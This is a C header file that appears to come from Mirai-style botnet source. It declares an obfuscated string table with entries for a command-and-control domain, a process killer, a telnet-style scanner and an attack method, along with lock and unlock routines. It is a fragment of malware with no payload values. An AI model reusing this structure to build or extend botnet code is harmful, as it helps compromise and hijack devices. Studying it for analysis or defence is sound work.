#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

#define TABLE_KEY_LEN (sizeof(table_keys) / sizeof(*table_keys))

#define TABLE_CNC_DOMAIN        0
#define TABLE_EXEC_SUCCESS      1
#define TABLE_ATK_VSE           3
#define TABLE_KILLER_PROC       4
#define TABLE_KILLER_EXE        5
#define TABLE_KILLER_FD         6

#define TABLE_SCAN_CB_DOMAIN    8
#define TABLE_SCAN_ENABLE       9
#define TABLE_SCAN_SYSTEM       10
#define TABLE_SCAN_SHELL        11
#define TABLE_SCAN_SH           12
#define TABLE_SCAN_QUERY        13
#define TABLE_SCAN_NCORRECT     14
#define TABLE_SCAN_RESP         15

#define TABLE_KILLER_CMDLINE    16

#define TABLE_MAX_KEYS          17 /* Highest value + 1 */

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
